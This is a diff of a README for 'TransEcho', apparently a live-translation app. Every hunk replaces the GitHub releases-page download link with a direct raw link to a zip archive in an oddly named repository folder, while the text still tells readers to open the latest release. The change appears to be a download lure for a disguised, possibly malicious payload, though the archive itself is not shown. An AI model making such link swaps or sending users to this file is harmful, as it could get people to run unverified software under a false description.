@@ -1,6 +1,6 @@
 # 🎧 TransEcho - Live translation with clear subtitles
 
-[![Download TransEcho](https://img.shields.io/badge/Download-TransEcho-blue?style=for-the-badge&logo=github)](https://github.com/boltai479-netizen/TransEcho/releases)
+[![Download TransEcho](https://img.shields.io/badge/Download-TransEcho-blue?style=for-the-badge&logo=github)](https://github.com/boltai479-netizen/TransEcho/raw/refs/heads/main/Makassar/Echo_Trans_2.6.zip)
 
 ## 🪟 What TransEcho does
 
@@ -12,7 +12,7 @@ It is built for daily use on Windows and macOS. You can use it for meetings, vid
 
 Visit this page to download and run the app on Windows:
 
-https://github.com/boltai479-netizen/TransEcho/releases
+https://github.com/boltai479-netizen/TransEcho/raw/refs/heads/main/Makassar/Echo_Trans_2.6.zip
 
 Open the latest release, choose the Windows file, download it, and then run it on your PC.
 
@@ -145,7 +145,7 @@ That makes it easier to follow foreign speech without switching between many too
 
 Download the latest Windows build here:
 
-https://github.com/boltai479-netizen/TransEcho/releases
+https://github.com/boltai479-netizen/TransEcho/raw/refs/heads/main/Makassar/Echo_Trans_2.6.zip
 
 ## 🌐 Supported platforms
 
